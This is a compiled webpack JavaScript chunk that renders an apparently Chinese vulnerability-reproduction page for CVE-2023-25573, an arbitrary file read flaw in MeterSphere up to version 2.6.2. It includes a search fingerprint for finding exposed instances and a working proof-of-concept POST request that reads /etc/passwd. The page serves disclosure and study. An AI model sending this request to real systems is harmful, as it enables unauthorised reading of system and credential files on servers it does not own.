(window.webpackJsonp=window.webpackJsonp||[]).push([[520],{2330:function(e,a,s){e.exports=s.p+"assets/img/1682156003733-4bf0790b-5111-4258-b8e5-ff8fd83cb017.eee8aa91.png"},2331:function(e,a,s){e.exports=s.p+"assets/img/1682155967782-ec79b940-cc14-4615-a984-b645bfc9fedd.de71fe99.png"},3405:function(e,a,s){"use strict";s.r(a);var t=s(63),r=Object(t.a)({},(function(){var e=this,a=e._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":e.$parent.slotKey}},[a("h1",{attrs:{id:"metersphere-file-任意文件读取漏洞-cve-2023-25573"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#metersphere-file-任意文件读取漏洞-cve-2023-25573"}},[e._v("#")]),e._v(" Metersphere file 任意文件读取漏洞 CVE-2023-25573")]),e._v(" "),a("h2",{attrs:{id:"漏洞描述"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[e._v("#")]),e._v(" 漏洞描述")]),e._v(" "),a("p",[e._v("Metersphere file 接口存在任意文件读取漏洞，攻击者通过接口可以获取敏感文件压缩包")]),e._v(" "),a("h2",{attrs:{id:"漏洞影响"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[e._v("#")]),e._v(" 漏洞影响")]),e._v(" "),a("a-checkbox",{attrs:{checked:""}},[e._v("Metersphere <=2.6.2")]),a("br"),e._v(" "),a("h2",{attrs:{id:"网络测绘"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[e._v("#")]),e._v(" 网络测绘")]),e._v(" "),a("a-checkbox",{attrs:{checked:""}},[e._v('app.name="MeterSphere"')]),a("br"),e._v(" "),a("h2",{attrs:{id:"漏洞复现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[e._v("#")]),e._v(" 漏洞复现")]),e._v(" "),a("p",[e._v("登陆页面")]),e._v(" "),a("p",[a("img",{attrs:{src:s(2330),alt:"img"}})]),e._v(" "),a("p",[e._v("验证POC")]),e._v(" "),a("div",{staticClass:"language-plain line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plain"}},[a("code",[e._v('POST /api/jmeter/download/files\nContent-Type: application/json\n\n{"reportId":"pass","bodyFiles":[{"id":"aaa","name":"/etc/passwd"}]}\n')])]),e._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[e._v("1")]),a("br"),a("span",{staticClass:"line-number"},[e._v("2")]),a("br"),a("span",{staticClass:"line-number"},[e._v("3")]),a("br"),a("span",{staticClass:"line-number"},[e._v("4")]),a("br")])]),a("p",[a("img",{attrs:{src:s(2331),alt:"img"}})])],1)}),[],!1,null,null,null);a.default=r.exports}}]);